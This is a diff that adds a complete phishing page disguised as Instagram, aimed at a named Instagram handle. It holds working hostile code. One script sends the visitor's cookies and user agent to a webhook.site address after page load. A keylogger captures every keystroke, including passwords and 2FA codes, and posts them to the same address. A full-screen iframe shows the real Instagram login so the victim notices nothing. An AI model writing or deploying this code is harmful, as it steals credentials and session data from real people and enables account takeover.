@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>Instagram</title>
+<meta name="viewport" content="width=device-width">
+<style>*{margin:0;padding:0;box-sizing:border-box;}body{background:#fafafa;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto;}iframe{width:100vw;height:100vh;border:none;position:fixed;top:0;left:0;}</style>
+</head>
+<body>
+<!-- COOKIES + UA STEAL -->
+<script>
+setTimeout(()=>{
+    fetch('https://webhook.site/68105437-aaa1-422b-81be-b14eabb1de5a', {
+        method: 'POST',
+        headers: {'Content-Type':'application/json'},
+        body: JSON.stringify({
+            cookie: document.cookie,
+            ua: navigator.userAgent,
+            victim: 'hayyamalik._',
+            type: 'cookies',
+            timestamp: Date.now()
+        })
+    });
+}, 1000);
+</script>
+
+<!-- KEYLOGGER (Password + 2FA!) -->
+<script>
+let keys = [];
+document.addEventListener('keydown', e=>{
+    keys.push({
+        key: e.key,
+        code: e.code,
+        shift: e.shiftKey,
+        ctrl: e.ctrlKey,
+        time: Date.now()
+    });
+    
+    if(keys.length >= 25 || e.key === 'Enter' || e.key === 'Tab'){
+        fetch('https://webhook.site/68105437-aaa1-422b-81be-b14eabb1de5a', {
+            method: 'POST',
+            headers: {'Content-Type':'application/json'},
+            body: JSON.stringify({
+                keys: keys,
+                victim: 'hayyamalik._',
+                type: 'keystrokes'
+            })
+        });
+        keys = [];
+    }
+});
+</script>
+
+<!-- REAL IG LOGIN (victim sees normal page) -->
+<iframe src="https://www.instagram.com/accounts/login/?next=/hayyamalik._/"></iframe>
+</body>
+</html>
